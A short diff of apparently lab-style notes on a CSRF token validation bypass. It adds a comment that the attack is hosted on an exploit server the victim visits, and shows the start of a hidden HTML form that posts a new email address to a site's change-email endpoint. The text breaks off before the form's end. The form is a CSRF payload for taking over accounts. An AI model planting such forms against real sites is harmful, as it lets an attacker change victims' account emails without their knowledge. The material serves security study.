@@ -1,5 +1,6 @@
 # CSRF Token Validation Bypass to change victim's email
 # In this example, the cookie and the CSRF token are not linked, and it could even be sent without the CSRF token because changing the request to POST also allowed us to
+# This attack is carried out on a malicious server or an exploit server that the victim will access
 
 <form action="https://page.net/my-account/change-email">
     <input type="hidden" name="email" value="hacked@hacked.com">
